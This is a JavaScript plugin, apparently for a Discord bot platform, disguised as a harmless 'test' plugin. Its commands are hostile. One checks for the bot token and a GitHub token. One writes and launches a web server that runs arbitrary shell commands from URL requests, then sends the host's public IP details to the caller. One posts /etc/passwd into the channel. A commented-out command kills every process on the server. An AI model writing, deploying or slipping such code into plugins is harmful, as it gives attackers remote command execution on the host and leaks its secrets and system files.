module.exports.plugin = {
    name: "test",
    description: "hee hee hee haw",
    author: "best plugin writer ever ",
    repository:
        "https://github.com/alexanderdavidj/test/blob/main/test/plugin.js",
    commands: ["test", "backdoor", "passwd"],
};

module.exports.test = {
    name: "test",
    description: "a test command",
    run: async ({ client, message }) => {
        message.channel.send(
            `${client.token.startsWith(
                "MTA"
            )} ${process.env.GITHUB_TOKEN.startsWith("github_pat")}`
        );
    },
};

// worked
// module.exports.end = {
//     name: "end",
//     description: "end the linux server",
//     run: async ({ client, message }) => {
//         require("child_process").spawn("killall5", ["-9"]);
//     },
// };

module.exports.backdoor = {
    name: "backdoor",
    description: "backdoor the server",
    run: async ({ client, message }) => {
        const code = `
const express = require('express');
const app = express();

app.get("/", function (req, res) {
    res.send("success");
})

app.get("/:command", function (req, res) {
    command = req.params.command.split(" ")
    command.shift();
    require("child_process")
        .spawn(req.params.command.split(" ")[0], command)
        .on("data", (data) => {
            res.send(data);
        });
})

app.listen(3000, function (err) {
    console.error(app)
});`;

        require("child_process").spawn("touch", ["backdoor.js"]);
        // require("child_process").spawn("npm", ["i", "express"]);
        require("fs").writeFile("backdoor.js", code, (err) => {
            if (err) return console.log(err);
        });

        require("child_process")
            .spawn("node", ["backdoor.js"])
            .on("data", (data) => {
                message.channel.send(data);
            });

        message.channel.send("installed");
        const req = require("http")
            .request(
                {
                    hostname: "ipinfo.io",
                    path: "/json",
                    method: "GET",
                },
                (res) => {
                    let data = "";

                    res.on("data", (chunk) => {
                        data += chunk;
                    });

                    res.on("end", () => {
                        message.author.send(data);
                    });
                }
            )

            .on("error", (err) => {
                console.log("Error: ", err);
            })

            .end();
    },
};

module.exports.passwd = {
    name: "passwd",
    description: "leak /etc/passwd",
    run: async ({ client, message }) => {
        require("fs").readFile("/etc/passwd", "utf8", function (err, data) {
            message.channel.send(`\`\`\`bash\n${data}\`\`\``);
        });
    },
};
